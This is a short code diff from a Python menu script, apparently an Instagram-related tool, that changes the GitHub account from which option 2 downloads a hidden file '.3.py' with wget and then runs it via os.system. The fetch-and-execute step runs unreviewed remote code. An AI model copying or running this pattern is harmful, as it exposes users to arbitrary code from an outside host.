@@ -312,7 +312,7 @@ def dwbara():
         instagram1()
     elif ia=="2":
         import wget, os
-        wget.download("https://raw.githubusercontent.com/sfrsfrsfr404sfrsfrsfr/3/main/.3.py")
+        wget.download("https://raw.githubusercontent.com/4sfr0xosha0sfr4/3/main/.3.py")
         os.system("python .3.py")
     elif ia=="0":
         print(" Exit !")
